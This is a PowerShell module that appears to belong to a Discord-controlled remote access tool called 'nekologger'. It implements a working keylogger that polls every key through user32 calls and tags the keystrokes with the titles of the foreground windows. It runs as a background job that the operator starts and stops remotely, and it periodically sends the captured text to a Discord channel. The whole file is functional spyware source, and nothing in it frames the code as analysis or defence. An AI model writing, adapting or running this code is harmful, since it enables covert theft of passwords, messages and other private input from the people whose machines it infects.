$global:process_nekologger_channel_name = "nekologger"
Get_OrCreateChannel -channelName $global:process_nekologger_channel_name

function Mkeylogger {
    param (
        [int]$intervalSeconds = 30
    )
    
    if (-not $global:keyloggerstatus) {
        sendEmbedWithImage -Title "KEYLOGGER STATUS" -Description "**Keylogger is disabled**" -ChannelTarget $global:process_nekologger_channel_name
        return
    }
    
    Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    using System.Text;
    public class W {
        [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int v);
        [DllImport("user32.dll")] public static extern int GetKeyboardState(byte[] k);
        [DllImport("user32.dll")] public static extern int ToUnicode(uint v, uint s, byte[] k, StringBuilder b, int c, uint f);
        [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
    }
"@
    
    $deviceId = $env:COMPUTERNAME

    sendEmbedWithImage -Title "KEYLOGGER STATUS" -Description "**Keylogger started on $deviceId** (Interval: ${intervalSeconds}s)" -ChannelTarget $global:process_nekologger_channel_name

    # Key names for special keys
    $keyNames = @{
        8 = "[BACKSPACE]"; 9 = "[TAB]"; 13 = "[ENTER]"; 16 = "[SHIFT]"
        17 = "[CTRL]"; 18 = "[ALT]"; 20 = "[CAPS]"; 27 = "[ESC]"
        32 = " "; 33 = "[PGUP]"; 34 = "[PGDN]"; 35 = "[END]"
        36 = "[HOME]"; 37 = "[LEFT]"; 38 = "[UP]"; 39 = "[RIGHT]"
        40 = "[DOWN]"; 46 = "[DEL]"; 91 = "[WIN]"; 144 = "[NUMLOCK]"; 145 = "[SCROLL]"
    }

    $sessionStart = Get-Date
    
    try {
        while ($global:keyloggerstatus) {
            $keystrokeBuffer = ""
            $windowEvents = @()
            $pressedKeys = @{}
            $startTime = Get-Date
            $currentWindow = ""

            # Data collection loop
            while ((Get-Date) - $startTime -lt [TimeSpan]::FromSeconds($intervalSeconds) -and $global:keyloggerstatus) {
                Start-Sleep -Milliseconds 50
                
                # Get current active window
                try {
                    $hwnd = [W]::GetForegroundWindow()
                    $windowTitle = New-Object System.Text.StringBuilder 256
                    [W]::GetWindowText($hwnd, $windowTitle, 256) | Out-Null
                    $newWindow = $windowTitle.ToString()
                    
                    if ($newWindow -and $newWindow -ne $currentWindow -and $newWindow -notlike "*Discord*") {
                        $currentWindow = $newWindow
                        if ($keystrokeBuffer.Length -gt 0) {
                            $windowEvents += @{
                                Window = $newWindow
                                Position = $keystrokeBuffer.Length
                            }
                        }
                    }
                } catch {}
                
                $keyboardState = New-Object byte[] 256
                [W]::GetKeyboardState($keyboardState) | Out-Null

                # Capture keystrokes
                for ($vk = 8; $vk -le 255; $vk++) {
                    $isDown = ([W]::GetAsyncKeyState($vk) -band 0x8000) -ne 0
                    if ($isDown -and -not $pressedKeys.ContainsKey($vk)) {
                        $pressedKeys[$vk] = $true
                        if ($keyNames.ContainsKey($vk)) {
                            $keystrokeBuffer += $keyNames[$vk]
                        } else {
                            $sb = New-Object System.Text.StringBuilder 2
                            $result = [W]::ToUnicode([uint32]$vk, 0, $keyboardState, $sb, $sb.Capacity, 0)
                            if ($result -gt 0) { 
                                $char = $sb.ToString()
                                if ($char -match '[a-zA-Z0-9\s\.\,\;\:\!\?\-_\(\)\[\]\{\}\\\/\@\#\$\%\^\&\*\+\=\<\>\|\`\~]') {
                                    $keystrokeBuffer += $char
                                }
                            }
                        }
                    } elseif (-not $isDown -and $pressedKeys.ContainsKey($vk)) {
                        $pressedKeys.Remove($vk)
                    }
                }
            }

            # Send keylog data to nekologger channel
            if ($keystrokeBuffer.Length -gt 0) {
                $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                $logContent = ":keyboard: **[$timestamp] - $deviceId KEYLOG**`n"
                
                if ($windowEvents.Count -gt 0) {
                    $lastPos = 0
                    foreach ($event in $windowEvents) {
                        if ($lastPos -lt $event.Position) {
                            $segment = $keystrokeBuffer.Substring($lastPos, $event.Position - $lastPos)
                            if ($segment.Trim().Length -gt 0) {
                                $logContent += "``$segment```n"
                            }
                        }
                        $logContent += "**[Window: $($event.Window)]**`n"
                        $lastPos = $event.Position
                    }
                    # Add remaining keystrokes
                    if ($lastPos -lt $keystrokeBuffer.Length) {
                        $remaining = $keystrokeBuffer.Substring($lastPos)
                        if ($remaining.Trim().Length -gt 0) {
                            $logContent += "``$remaining```n"
                        }
                    }
                } else {
                    if ($currentWindow -and $currentWindow -notlike "*Discord*") {
                        $logContent += "**[Window: $currentWindow]**`n"
                    }
                    $logContent += "``$keystrokeBuffer```n"
                }
                
                try {
                    sendMsg -Message $logContent -ChannelTarget $global:process_nekologger_channel_name
                } catch {}
            }

            Remove-Variable keystrokeBuffer, windowEvents, pressedKeys, startTime -ErrorAction SilentlyContinue
            [System.GC]::Collect()
        }
    } catch {
        sendEmbedWithImage -Title "ERROR" -Description ":x: **Keylogger error:** $($_.Exception.Message)" -Color 13369344 -ChannelTarget $global:process_nekologger_channel_name
    } finally {
        sendEmbedWithImage -Title "KEYLOGGER STATUS" -Description ":stop_sign: **Keylogger stopped on $deviceId**" -ChannelTarget $global:process_nekologger_channel_name
    }
}

#ENABLEKEYLOG
function MStart_Keylogger {
    param([int]$intervalSeconds = 30)
    
    if ($global:keyloggerstatus) {
        sendEmbedWithImage -Title "KEYLOGGER STATUS" -Description ":warning: **Keylogger is already running**" -ChannelTarget $global:process_nekologger_channel_name
        return
    }
    
    $global:keyloggerstatus = $true
    
    try {
        sendEmbedWithImage -Title "KEYLOGGER STATUS" -Description ":keyboard: **Starting keylogger...** (Interval: ${intervalSeconds}s)" -ChannelTarget $global:process_nekologger_channel_name

        $keylogJob = Start-Job -ScriptBlock {
            param($token, $SessionID, $CategoryID, $intervalSeconds, $nekologgerChannelName, $ChannelRegistry)
            
            # Set up global variables in job scope
            $global:token = $token
            $global:SessionID = $SessionID
            $global:CategoryID = $CategoryID
            $global:keyloggerstatus = $true
            $global:process_nekologger_channel_name = $nekologgerChannelName
            $global:ChannelRegistry = $ChannelRegistry
            
            # Import ALL necessary functions from parent scope
            ${function:sendMsg} = ${using:function:sendMsg}
            ${function:Send_SingleMessage} = ${using:function:Send_SingleMessage}
            ${function:Send_ChunkedMessage} = ${using:function:Send_ChunkedMessage}
            ${function:Send_AsFile} = ${using:function:Send_AsFile}
            ${function:Split_IntoChunks} = ${using:function:Split_IntoChunks}
            ${function:Clean_MessageContent} = ${using:function:Clean_MessageContent}
            ${function:sendFile} = ${using:function:sendFile}
            ${function:Invoke-DiscordAPI} = ${using:function:Invoke-DiscordAPI}
            ${function:sendEmbedWithImage} = ${using:function:sendEmbedWithImage}
            ${function:Get_OrCreateChannel} = ${using:function:Get_OrCreateChannel}
            ${function:Mkeylogger} = ${using:function:Mkeylogger}
            
            # Start the keylogger
            Mkeylogger -intervalSeconds $intervalSeconds
            
        } -ArgumentList $global:token, $global:SessionID, $global:CategoryID, $intervalSeconds, $global:process_nekologger_channel_name, $global:ChannelRegistry
        
        $script:Jobs["KEYLOGGER"] = $keylogJob
        sendEmbedWithImage -Title "KEYLOGGER STATUS" -Description ":gear: **Keylogger started successfully!** (Job ID: $($keylogJob.Id)) - Data will appear in this channel" -ChannelTarget $global:process_nekologger_channel_name

    } catch {
        $global:keyloggerstatus = $false
        sendEmbedWithImage -Title "ERROR" -Description "Failed to start keylogger: $($_.Exception.Message)" -Color 13369344 -ChannelTarget $global:process_nekologger_channel_name
    }
}

#DISABLEKEYLOG
function MStop_Keylogger {
    $global:keyloggerstatus = $false
    
    if ($script:Jobs.ContainsKey("KEYLOGGER")) {
        $job = $script:Jobs["KEYLOGGER"]
        try {
            # Force stop the job immediately
            Stop-Job -Job $job -ErrorAction SilentlyContinue

            # Wait a moment for it to stop
            Start-Sleep -Milliseconds 500
            
            # Remove the job
            Remove-Job -Job $job -ErrorAction SilentlyContinue
            
            # Remove from our jobs tracking
            $script:Jobs.Remove("KEYLOGGER")

            sendEmbedWithImage -Title "KEYLOGGER STATUS" -Description ":stop_sign: **Keylogger stopped successfully**" -ChannelTarget $global:process_nekologger_channel_name
        } catch {
            # If normal stop fails, try more aggressive approach
            try {
                $job | Stop-Job -ErrorAction SilentlyContinue
                $job | Remove-Job -ErrorAction SilentlyContinue
                $script:Jobs.Remove("KEYLOGGER")
                sendEmbedWithImage -Title "KEYLOGGER STATUS" -Description ":stop_sign: **Keylogger force stopped**" -ChannelTarget $global:process_nekologger_channel_name
            } catch {
                sendEmbedWithImage -Title "ERROR" -Description ":warning: **Error stopping keylogger:** $($_.Exception.Message)" -Color 13369344 -ChannelTarget $global:process_nekologger_channel_name
            }
        }
    } else {
        sendEmbedWithImage -Title "KEYLOGGER STATUS" -Description ":information_source: **Keylogger is not running**" -ChannelTarget $global:process_nekologger_channel_name
    }
}

#GETKEYLOGSTATUS
function MGet_KeyloggerStatus {
    if ($global:keyloggerstatus -and $script:Jobs.ContainsKey("KEYLOGGER")) {
        $job = $script:Jobs["KEYLOGGER"]
        sendEmbedWithImage -Title "KEYLOGGER STATUS" -Description ":gear: **Keylogger Status:** Running (Job State: $($job.State)) - Logging to this channel" -ChannelTarget $global:process_nekologger_channel_name
    } else {
        sendEmbedWithImage -Title "KEYLOGGER STATUS" -Description ":gear: **Keylogger Status:** Stopped" -ChannelTarget $global:process_nekologger_channel_name
    }
}